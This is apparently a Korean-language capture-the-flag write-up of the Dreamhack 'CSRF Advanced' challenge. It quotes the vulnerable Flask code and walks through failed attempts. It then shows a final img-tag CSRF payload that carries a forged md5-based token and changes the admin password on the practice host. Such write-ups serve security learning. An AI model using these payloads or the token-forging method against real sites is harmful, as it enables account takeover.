---
title: "[Dreamhack] CSRF Advanced  문제 풀이"
date: 2026-08-23
categories: [Dreamhack, Web Hacking]
tags: [Nosqli, sqli, mongoDB]
---

##  [Dreamehack] CSRF Advanced  문제 풀이

* 문제 설명
Description
Exercise: CSRF Advanced에서 실습하는 문제입니다.

* 주요 코드
'''python
// login 엔드포인트
if pw == password:
    resp = make_response(redirect(url_for('index')) )
    session_id = os.urandom(8).hex()
    session_storage[session_id] = username
    token_storage[session_id] = md5((username + request.remote_addr).encode()).hexdigest()
    resp.set_cookie('sessionid', session_id)

// vuln 엔드포인트 (XSS 필터)
    xss_filter = ["frame", "script", "on"]
    for _ in xss_filter:
        param = param.replace(_, "*")
    return param

// change_password 엔드포인트
if pw == None:
    return render_template('change_password.html', csrf_token=csrf_token)
else:
    if csrf_token != request.args.get("csrftoken", ""):
        return '<script>alert("wrong csrf token");history.go(-1);</script>'
    users[username] = pw
    return '<script>alert("Done");history.go(-1);</script>'
'''

* 서버 구조

- 서버 내 selenium이 vuln 엔드포인트에 들어가 param안에 들어있던 url을 가져오고 그 곳에 들어가는 자동화가 되어있음
=>(실제 사람이 피싱 사이트에 들어가 보이지 않는 명령을 실행하는 과정이 자동화 되어있음)

- 공격자는 flag 엔드포인트(vuln에 코드를 업로드 해주는 엔드포인트)에 공격코드를 업로드하는 방식

* 시도 1 [<form>태그 사용]

'''javascript
<form action="http://host3.dreamhack.games:22706/change_password" method="GET">
    <input name="pw" value="1" />
</form>
<script>
    document.forms[0].submit();
</script>
'''

=> script 필터링으로 인해 불가 이외에도 on script frame 의 대소문자 필터링까지 있어 이 방식이 아닌 img 방식을 사용하기로 결정

* 시도 2 [img 사용]

'''javacript
<img src="http://host3.dreamhack.games:22706/change_password?pw=1" />
'''

비밀번호가 변경되지 않았음, 이유를 확인하기 위해 guest계정으로 들어가 직접 pw=1로 쿼리를 줘 본 결과 

'''python
if csrf_token != request.args.get("csrftoken", ""):
    return '<script>alert("wrong csrf token");history.go(-1);</script>'
'''

코드에 의해 csrf 토큰이 일치하지 않다고 나옴 쿼리에 csrftoken에 올바른 토큰이 들어가야 전송이 됨을 확인

* 시도 3 [pw == NULL 이용]

'''python
if pw == None:
    return render_template('change_password.html', csrf_token=csrf_token)
'''

코드에서 pw값이 공백이라면 else문을 거치지 않고 통과하지 않을까 시도 => 실패
pw == None의 의미는 값이 없음이 아닌 pw 쿼리 자체가 없을 때를 의미 즉, 엔드포인트에 들어왔을 때 change_password 페이지를 올려주는 것을 의미

* 시도 4 [csrf token 만들기]

로그인 엔드페이지 속 토큰은 token_storage[session_id] = md5((username + request.remote_addr).encode()).hexdigest() 으로 만들어짐 여기서 username은 id requeset.remote_addr은 요청자의 ip를 의미 => 본인이 접속 시 127.0.0.1 일것임
=> "admin" + "127.0.0.1"을 md5로 해시화하면 csrftoken이 됨

'''python
#!/usr/bin/python3

from hashlib import md5

data= "admin" + "127.0.0.1"

hash_object = md5(data.encode()).hexdigest()
print(hash_object)

'''

md5로 해시한 결과 7505b9c72ab4aa94b1a4ed7b207b67fb가 csrftoken인걸 알게 됨 => 이를 쿼리에 csrftoken 의 값으로 설정

[최종 exploit]


'''javacript
<img src="http://host3.dreamhack.games:22706/change_password?pw=1&csrftoken=7505b9c72ab4aa94b1a4ed7b207b67fb" />
'''

이후 변경한 id로 로그인을 하면 flag 확인이 가능